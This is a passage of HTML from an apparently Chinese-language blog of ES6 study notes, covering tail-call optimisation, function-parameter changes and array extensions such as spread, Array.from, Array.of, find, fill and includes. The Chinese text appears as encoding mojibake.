&#123;</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">100000</span>)</span><br><span class="line"><span class="comment">// 100001</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>tco</code>å‡½æ•°æ˜¯å°¾é€’å½’ä¼˜åŒ–çš„å®ç°ï¼Œå®ƒçš„å¥¥å¦™å°±åœ¨äºçŠ¶æ€å˜é‡<code>active</code>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå˜é‡æ˜¯ä¸æ¿€æ´»çš„ã€‚ä¸€æ—¦è¿›å…¥å°¾é€’å½’ä¼˜åŒ–çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªå˜é‡å°±æ¿€æ´»äº†ã€‚ç„¶åï¼Œæ¯ä¸€è½®é€’å½’<code>sum</code>è¿”å›çš„éƒ½æ˜¯<code>undefined</code>ï¼Œæ‰€ä»¥å°±é¿å…äº†é€’å½’æ‰§è¡Œï¼›è€Œ<code>accumulated</code>æ•°ç»„å­˜æ”¾æ¯ä¸€è½®<code>sum</code>æ‰§è¡Œçš„å‚æ•°ï¼Œæ€»æ˜¯æœ‰å€¼çš„ï¼Œè¿™å°±ä¿è¯äº†<code>accumulator</code>å‡½æ•°å†…éƒ¨çš„<code>while</code>å¾ªç¯æ€»æ˜¯ä¼šæ‰§è¡Œã€‚è¿™æ ·å°±å¾ˆå·§å¦™åœ°å°†â€œé€’å½’â€æ”¹æˆäº†â€œå¾ªç¯â€ï¼Œè€Œåä¸€è½®çš„å‚æ•°ä¼šå–ä»£å‰ä¸€è½®çš„å‚æ•°ï¼Œä¿è¯äº†è°ƒç”¨æ ˆåªæœ‰ä¸€å±‚ã€‚</p><h2 id="7ã€å‡½æ•°å‚æ•°çš„å°¾é€—å·"><a href="#7ã€å‡½æ•°å‚æ•°çš„å°¾é€—å·" class="headerlink" title="7ã€å‡½æ•°å‚æ•°çš„å°¾é€—å·"></a>7ã€å‡½æ•°å‚æ•°çš„å°¾é€—å·</h2><p>ES2017 å…è®¸å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°æœ‰å°¾é€—å·ã€‚</p><h2 id="8ã€Function-prototype-toString"><a href="#8ã€Function-prototype-toString" class="headerlink" title="8ã€Function.prototype.toString()"></a>8ã€Function.prototype.toString()</h2><p><a href="https://github.com/tc39/Function-prototype-toString-revision">ES2019</a> å¯¹å‡½æ•°å®ä¾‹çš„<code>toString()</code>æ–¹æ³•åšå‡ºäº†ä¿®æ”¹ã€‚ä»¥å‰<code>toString()</code>æ–¹æ³•è¿”å›å‡½æ•°ä»£ç æœ¬èº«ï¼Œä¼šçœç•¥æ³¨é‡Šå’Œç©ºæ ¼ã€‚ä¿®æ”¹åæ˜ç¡®è¦æ±‚è¿”å›ä¸€æ¨¡ä¸€æ ·çš„åŸå§‹ä»£ç ã€‚</p><h2 id="9ã€catch-å‘½ä»¤çš„å‚æ•°çœç•¥"><a href="#9ã€catch-å‘½ä»¤çš„å‚æ•°çœç•¥" class="headerlink" title="9ã€catch å‘½ä»¤çš„å‚æ•°çœç•¥"></a>9ã€catch å‘½ä»¤çš„å‚æ•°çœç•¥</h2><p>JavaScript è¯­è¨€çš„<code>try...catch</code>ç»“æ„ï¼Œä»¥å‰æ˜ç¡®è¦æ±‚<code>catch</code>å‘½ä»¤åé¢å¿…é¡»è·Ÿå‚æ•°ï¼Œæ¥å—<code>try</code>ä»£ç å—æŠ›å‡ºçš„é”™è¯¯å¯¹è±¡ã€‚ES2019åˆ™å…è®¸<code>catch</code>è¯­å¥çœç•¥å‚æ•°ã€‚</p><h1 id="æ•°ç»„çš„æ‰©å±•"><a href="#æ•°ç»„çš„æ‰©å±•" class="headerlink" title="æ•°ç»„çš„æ‰©å±•"></a>æ•°ç»„çš„æ‰©å±•</h1><h2 id="1ã€æ‰©å±•è¿ç®—ç¬¦"><a href="#1ã€æ‰©å±•è¿ç®—ç¬¦" class="headerlink" title="1ã€æ‰©å±•è¿ç®—ç¬¦"></a>1ã€æ‰©å±•è¿ç®—ç¬¦</h2><h3 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h3><p>æ‰©å±•è¿ç®—ç¬¦ï¼ˆspreadï¼‰æ˜¯ä¸‰ä¸ªç‚¹ï¼ˆ<code>...</code>ï¼‰ã€‚å®ƒå¥½æ¯” rest å‚æ•°çš„é€†è¿ç®—ï¼Œå°†ä¸€ä¸ªæ•°ç»„è½¬ä¸ºç”¨é€—å·åˆ†éš”çš„å‚æ•°åºåˆ—ã€‚</p><p>è¯¥è¿ç®—ç¬¦ä¸»è¦ç”¨äºå‡½æ•°è°ƒç”¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  array.push(...items);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰©å±•è¿ç®—ç¬¦åé¢è¿˜å¯ä»¥æ”¾ç½®è¡¨è¾¾å¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  ...(x &gt; <span class="number">0</span> ? [<span class="string">&#x27;a&#x27;</span>] : []),</span><br><span class="line">  <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰©å±•è¿ç®—ç¬¦åé¢æ˜¯ä¸€ä¸ªç©ºæ•°ç»„ï¼Œåˆ™ä¸äº§ç”Ÿä»»ä½•æ•ˆæœã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[...[], <span class="number">1</span>]</span><br><span class="line"><span class="comment">// [1]</span></span><br></pre></td></tr></table></figure><h3 id="æ›¿ä»£å‡½æ•°çš„-apply-æ–¹æ³•"><a href="#æ›¿ä»£å‡½æ•°çš„-apply-æ–¹æ³•" class="headerlink" title="æ›¿ä»£å‡½æ•°çš„ apply æ–¹æ³•"></a>æ›¿ä»£å‡½æ•°çš„ apply æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 çš„å†™æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y, z</span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">f.apply(<span class="literal">null</span>, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6çš„å†™æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y, z</span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> args = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">f(...args);</span><br></pre></td></tr></table></figure><h3 id="æ‰©å±•è¿ç®—ç¬¦çš„åº”ç”¨"><a href="#æ‰©å±•è¿ç®—ç¬¦çš„åº”ç”¨" class="headerlink" title="æ‰©å±•è¿ç®—ç¬¦çš„åº”ç”¨"></a>æ‰©å±•è¿ç®—ç¬¦çš„åº”ç”¨</h3><p><strong>ï¼ˆ1ï¼‰å¤åˆ¶æ•°ç»„</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5 çš„å¤åˆ¶æ•°ç»„</span></span><br><span class="line"><span class="keyword">const</span> a2 = a1.concat();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 çš„å¤åˆ¶æ•°ç»„</span></span><br><span class="line"><span class="comment">// å†™æ³•ä¸€</span></span><br><span class="line"><span class="keyword">const</span> a2 = [...a1];</span><br><span class="line"><span class="comment">// å†™æ³•äºŒ</span></span><br><span class="line"><span class="keyword">const</span> [...a2] = a1;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰åˆå¹¶æ•°ç»„</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> arr2 = [<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> arr3 = [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5 çš„åˆå¹¶æ•°ç»„</span></span><br><span class="line">arr1.concat(arr2, arr3);</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6 çš„åˆå¹¶æ•°ç»„</span></span><br><span class="line">[...arr1, ...arr2, ...arr3]</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡ï¼Œè¿™ä¸¤ç§æ–¹æ³•éƒ½æ˜¯æµ…æ‹·è´ã€‚æ–°æ•°ç»„çš„æˆå‘˜éƒ½æ˜¯å¯¹åŸæ•°ç»„æˆå‘˜çš„å¼•ç”¨ï¼Œå¦‚æœä¿®æ”¹äº†å¼•ç”¨æŒ‡å‘çš„å€¼ï¼Œä¼šåŒæ­¥åæ˜ åˆ°æ–°æ•°ç»„ã€‚</p><p><strong>ï¼ˆ3ï¼‰ä¸è§£æ„èµ‹å€¼ç»“åˆ</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [first, ...rest] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">first <span class="comment">// 1</span></span><br><span class="line">rest  <span class="comment">// [2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...rest] = [];</span><br><span class="line">first <span class="comment">// undefined</span></span><br><span class="line">rest  <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...rest] = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">first  <span class="comment">// &quot;foo&quot;</span></span><br><span class="line">rest   <span class="comment">// []</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå°†æ‰©å±•è¿ç®—ç¬¦ç”¨äºæ•°ç»„èµ‹å€¼ï¼Œåªèƒ½æ”¾åœ¨å‚æ•°çš„æœ€åä¸€ä½ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p><strong>ï¼ˆ4ï¼‰å­—ç¬¦ä¸²</strong></p><p>æ‰©å±•è¿ç®—ç¬¦è¿˜å¯ä»¥å°†å­—ç¬¦ä¸²è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[...<span class="string">&#x27;hello&#x27;</span>]</span><br><span class="line"><span class="comment">// [ &quot;h&quot;, &quot;e&quot;, &quot;l&quot;, &quot;l&quot;, &quot;o&quot; ]</span></span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰å®ç°äº† Iterator æ¥å£çš„å¯¹è±¡</strong></p><p>ä»»ä½•å®šä¹‰äº†éå†å™¨ï¼ˆIteratorï¼‰æ¥å£çš„å¯¹è±¡ï¼Œéƒ½å¯ä»¥ç”¨æ‰©å±•è¿ç®—ç¬¦è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nodeList = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> array = [...nodeList];</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>querySelectorAll</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª<code>NodeList</code>å¯¹è±¡ï¼Œæ˜¯ç±»æ•°ç»„ã€‚è¿™æ—¶ï¼Œæ‰©å±•è¿ç®—ç¬¦å¯ä»¥å°†å…¶è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ï¼ŒåŸå› å°±åœ¨äº<code>NodeList</code>å¯¹è±¡å®ç°äº† Iterator ã€‚</p><h2 id="2ã€Array-from"><a href="#2ã€Array-from" class="headerlink" title="2ã€Array.from()"></a>2ã€Array.from()</h2><p><code>Array.from</code>æ–¹æ³•ç”¨äºå°†ä¸¤ç±»å¯¹è±¡è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ï¼šç±»ä¼¼æ•°ç»„çš„å¯¹è±¡å’Œå¯éå†çš„å¯¹è±¡ï¼ˆåŒ…æ‹¬ ES6 æ–°å¢çš„æ•°æ®ç»“æ„ Set å’Œ Mapï¼‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="attr">length</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5çš„å†™æ³•</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6çš„å†™æ³•</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure><p>å®é™…åº”ç”¨ä¸­ï¼Œå¸¸è§çš„ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡æ˜¯ DOM æ“ä½œè¿”å›çš„ NodeList é›†åˆï¼Œä»¥åŠå‡½æ•°å†…éƒ¨çš„<code>arguments</code>å¯¹è±¡ã€‚<code>Array.from</code>éƒ½å¯ä»¥å°†å®ƒä»¬è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚</p><p>æ‰€è°“ç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæœ¬è´¨ç‰¹å¾åªæœ‰ä¸€ç‚¹ï¼Œå³å¿…é¡»æœ‰<code>length</code>å±æ€§ã€‚å› æ­¤ï¼Œä»»ä½•æœ‰<code>length</code>å±æ€§çš„å¯¹è±¡ï¼Œéƒ½å¯ä»¥é€šè¿‡<code>Array.from</code>æ–¹æ³•è½¬ä¸ºæ•°ç»„ï¼Œè€Œæ­¤æ—¶æ‰©å±•è¿ç®—ç¬¦å°±æ— æ³•è½¬æ¢ã€‚</p><p><code>Array.from</code>è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œä½œç”¨ç±»ä¼¼äºæ•°ç»„çš„<code>map</code>æ–¹æ³•ï¼Œç”¨æ¥å¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œå¤„ç†ï¼Œå°†å¤„ç†åçš„å€¼æ”¾å…¥è¿”å›çš„æ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from(arrayLike, <span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä¾‹å­æ˜¯å–å‡ºä¸€ç»„ DOM èŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹ã€‚ï¼ˆæ„Ÿè§‰æŒºé‡è¦ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> spans = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;span.name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// map()</span></span><br><span class="line"><span class="keyword">let</span> names1 = <span class="built_in">Array</span>.prototype.map.call(spans, <span class="function"><span class="params">s</span> =&gt;</span> s.textContent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array.from()</span></span><br><span class="line"><span class="keyword">let</span> names2 = <span class="built_in">Array</span>.from(spans, <span class="function"><span class="params">s</span> =&gt;</span> s.textContent)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä¾‹å­å°†æ•°ç»„ä¸­å¸ƒå°”å€¼ä¸º<code>false</code>çš„æˆå‘˜è½¬ä¸º<code>0</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from([<span class="number">1</span>, , <span class="number">2</span>, , <span class="number">3</span>], <span class="function">(<span class="params">n</span>) =&gt;</span> n || <span class="number">0</span>)</span><br><span class="line"><span class="comment">// [1, 0, 2, 0, 3]</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>map</code>å‡½æ•°é‡Œé¢ç”¨åˆ°äº†<code>this</code>å…³é”®å­—ï¼Œè¿˜å¯ä»¥ä¼ å…¥<code>Array.from</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œç”¨æ¥ç»‘å®š<code>this</code>ã€‚</p><h2 id="3ã€Array-of"><a href="#3ã€Array-of" class="headerlink" title="3ã€Array.of()"></a>3ã€Array.of()</h2><p><code>Array.of()</code>æ–¹æ³•ç”¨äºå°†ä¸€ç»„å€¼ï¼Œè½¬æ¢ä¸ºæ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•çš„ä¸»è¦ç›®çš„ï¼Œæ˜¯å¼¥è¡¥æ•°ç»„æ„é€ å‡½æ•°<code>Array()</code>çš„ä¸è¶³ã€‚å› ä¸ºå‚æ•°ä¸ªæ•°çš„ä¸åŒï¼Œä¼šå¯¼è‡´<code>Array()</code>çš„è¡Œä¸ºæœ‰å·®å¼‚ã€‚åªæœ‰å½“å‚æ•°ä¸ªæ•°ä¸å°‘äº 2 ä¸ªæ—¶ï¼Œ<code>Array()</code>æ‰ä¼šè¿”å›ç”±å‚æ•°ç»„æˆçš„æ–°æ•°ç»„ã€‚å‚æ•°åªæœ‰ä¸€ä¸ªæ­£æ•´æ•°æ—¶ï¼Œå®é™…ä¸Šæ˜¯æŒ‡å®šæ•°ç»„çš„é•¿åº¦ã€‚</p><p><code>Array.of()</code>æ–¹æ³•å¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç æ¨¡æ‹Ÿå®ç°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ArrayOf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4ã€æ•°ç»„å®ä¾‹çš„-copyWithin"><a href="#4ã€æ•°ç»„å®ä¾‹çš„-copyWithin" class="headerlink" title="4ã€æ•°ç»„å®ä¾‹çš„ copyWithin()"></a>4ã€æ•°ç»„å®ä¾‹çš„ copyWithin()</h2><p>åœ¨å½“å‰æ•°ç»„å†…éƒ¨ï¼Œå°†æŒ‡å®šä½ç½®çš„æˆå‘˜å¤åˆ¶åˆ°å…¶ä»–ä½ç½®ï¼ˆä¼šè¦†ç›–åŸæœ‰æˆå‘˜ï¼‰ï¼Œç„¶åè¿”å›å½“å‰æ•°ç»„</p><h2 id="5ã€æ•°ç»„å®ä¾‹çš„-find-å’Œ-findIndex"><a href="#5ã€æ•°ç»„å®ä¾‹çš„-find-å’Œ-findIndex" class="headerlink" title="5ã€æ•°ç»„å®ä¾‹çš„ find() å’Œ findIndex()"></a>5ã€æ•°ç»„å®ä¾‹çš„ find() å’Œ findIndex()</h2><p>æ•°ç»„å®ä¾‹çš„<code>find</code>æ–¹æ³•ï¼Œç”¨äºæ‰¾å‡ºç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æ•°ç»„æˆå‘˜ã€‚å®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œæ‰€æœ‰æ•°ç»„æˆå‘˜ä¾æ¬¡æ‰§è¡Œè¯¥å›è°ƒå‡½æ•°ï¼Œç›´åˆ°æ‰¾å‡ºç¬¬ä¸€ä¸ªè¿”å›å€¼ä¸º<code>true</code>çš„æˆå‘˜ï¼Œç„¶åè¿”å›è¯¥æˆå‘˜ï¼›å¦‚æœæ²¡æœ‰ç¬¦åˆæ¡ä»¶çš„æˆå‘˜ï¼Œåˆ™è¿”å›<code>undefined</code>ã€‚<code>find</code>æ–¹æ³•çš„å›è°ƒå‡½æ•°å¯ä»¥æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œä¾æ¬¡ä¸ºå½“å‰çš„å€¼ã€å½“å‰çš„ä½ç½®å’ŒåŸæ•°ç»„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, -<span class="number">5</span>, <span class="number">10</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">// -5</span></span><br></pre></td></tr></table></figure><p>æ•°ç»„å®ä¾‹çš„<code>findIndex</code>æ–¹æ³•çš„ç”¨æ³•ä¸<code>find</code>æ–¹æ³•éå¸¸ç±»ä¼¼ï¼Œè¿”å›ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„æ•°ç»„æˆå‘˜çš„ä½ç½®ï¼Œå¦‚æœæ‰€æœ‰æˆå‘˜éƒ½ä¸ç¬¦åˆæ¡ä»¶ï¼Œåˆ™è¿”å›<code>-1</code>ã€‚</p><p>è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼Œç”¨æ¥ç»‘å®šå›è°ƒå‡½æ•°çš„<code>this</code>å¯¹è±¡ã€‚å¦å¤–ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•éƒ½å¯ä»¥å‘ç°<code>NaN</code>ï¼Œå¼¥è¡¥äº†æ•°ç»„çš„<code>indexOf</code>æ–¹æ³•çš„ä¸è¶³ã€‚</p><h2 id="6ã€æ•°ç»„å®ä¾‹çš„-fill"><a href="#6ã€æ•°ç»„å®ä¾‹çš„-fill" class="headerlink" title="6ã€æ•°ç»„å®ä¾‹çš„ fill()"></a>6ã€æ•°ç»„å®ä¾‹çš„ fill()</h2><p><code>fill</code>æ–¹æ³•ä½¿ç”¨ç»™å®šå€¼ï¼Œå¡«å……ä¸€ä¸ªæ•°ç»„ã€‚<code>fill</code>æ–¹æ³•ç”¨äºç©ºæ•°ç»„çš„åˆå§‹åŒ–éå¸¸æ–¹ä¾¿ã€‚æ•°ç»„ä¸­å·²æœ‰çš„å…ƒç´ ï¼Œä¼šè¢«å…¨éƒ¨æŠ¹å»ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>].fill(<span class="number">7</span>)</span><br><span class="line"><span class="comment">// [7, 7, 7]</span></span><br></pre></td></tr></table></figure><p><code>fill</code>æ–¹æ³•è¿˜å¯ä»¥æ¥å—ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œç”¨äºæŒ‡å®šå¡«å……çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½®ã€‚ï¼ˆä¸åŒ…æ‹¬ç»“æŸä½ç½®ï¼‰</p><p>æ³¨æ„ï¼Œå¦‚æœå¡«å……çš„ç±»å‹ä¸ºå¯¹è±¡ï¼Œé‚£ä¹ˆè¢«èµ‹å€¼çš„æ˜¯åŒä¸€ä¸ªå†…å­˜åœ°å€çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯æ·±æ‹·è´å¯¹è±¡ã€‚</p><h2 id="7ã€æ•°ç»„å®ä¾‹çš„-entries-ï¼Œkeys-å’Œ-values"><a href="#7ã€æ•°ç»„å®ä¾‹çš„-entries-ï¼Œkeys-å’Œ-values" class="headerlink" title="7ã€æ•°ç»„å®ä¾‹çš„ entries()ï¼Œkeys() å’Œ values()"></a>7ã€æ•°ç»„å®ä¾‹çš„ entries()ï¼Œkeys() å’Œ values()</h2><p>å®ƒä»¬éƒ½è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œå¯ä»¥ç”¨<code>for...of</code>å¾ªç¯è¿›è¡Œéå†ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯<code>keys()</code>æ˜¯å¯¹é”®åçš„éå†ã€<code>values()</code>æ˜¯å¯¹é”®å€¼çš„éå†ï¼Œ<code>entries()</code>æ˜¯å¯¹é”®å€¼å¯¹çš„éå†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [index, elem] <span class="keyword">of</span> [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>].entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, elem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0 &quot;a&quot;</span></span><br><span class="line"><span class="comment">// 1 &quot;b&quot;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸ä½¿ç”¨<code>for...of</code>å¾ªç¯ï¼Œå¯ä»¥æ‰‹åŠ¨è°ƒç”¨éå†å™¨å¯¹è±¡çš„<code>next</code>æ–¹æ³•ï¼Œè¿›è¡Œéå†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> letter = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> entries = letter.entries();</span><br><span class="line"><span class="built_in">console</span>.log(entries.next().value); <span class="comment">// [0, &#x27;a&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="8ã€æ•°ç»„å®ä¾‹çš„-includes"><a href="#8ã€æ•°ç»„å®ä¾‹çš„-includes" class="headerlink" title="8ã€æ•°ç»„å®ä¾‹çš„ includes()"></a>8ã€æ•°ç»„å®ä¾‹çš„ includes()</h2><p><code>Array.prototype.includes</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæŸä¸ªæ•°ç»„æ˜¯å¦åŒ…å«ç»™å®šçš„å€¼ï¼Œä¸å­—ç¬¦ä¸²çš„<code>includes</code>æ–¹æ³•ç±»ä¼¼ã€‚è¯¥æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæœç´¢çš„èµ·å§‹ä½ç½®ï¼Œé»˜è®¤ä¸º<code>0</code>ã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸ºè´Ÿæ•°ï¼Œåˆ™è¡¨ç¤ºå€’æ•°çš„ä½ç½®ï¼Œå¦‚æœè¿™æ—¶å®ƒå¤§äºæ•°ç»„é•¿åº¦ï¼ˆæ¯”å¦‚ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>-4</code>ï¼Œä½†æ•°ç»„é•¿åº¦ä¸º<code>3</code>ï¼‰ï¼Œåˆ™ä¼šé‡ç½®ä¸ºä»<code>0</code>å¼€å§‹ã€‚</p><p>æ²¡æœ‰è¯¥æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨æ•°ç»„çš„<code>indexOf</code>æ–¹æ³•ï¼Œæ£€æŸ¥æ˜¯å¦åŒ…å«æŸä¸ªå€¼ã€‚<code>indexOf</code>æ–¹æ³•æœ‰ä¸¤ä¸ªç¼ºç‚¹ï¼š</p><ul><li><p>ä¸å¤Ÿè¯­ä¹‰åŒ–ï¼Œå®ƒçš„å«ä¹‰æ˜¯æ‰¾åˆ°å‚æ•°å€¼çš„ç¬¬ä¸€ä¸ªå‡ºç°ä½ç½®ï¼Œæ‰€ä»¥è¦å»æ¯”è¾ƒæ˜¯å¦ä¸ç­‰äº<code>-1</code>ï¼Œè¡¨è¾¾èµ·æ¥ä¸å¤Ÿç›´è§‚ã€‚</p></li><li><p>å†…éƒ¨ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰è¿ç®—ç¬¦ï¼ˆ<code>===</code>ï¼‰è¿›è¡Œåˆ¤æ–­ï¼Œè¿™ä¼šå¯¼è‡´å¯¹<code>NaN</code>çš„è¯¯åˆ¤ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span 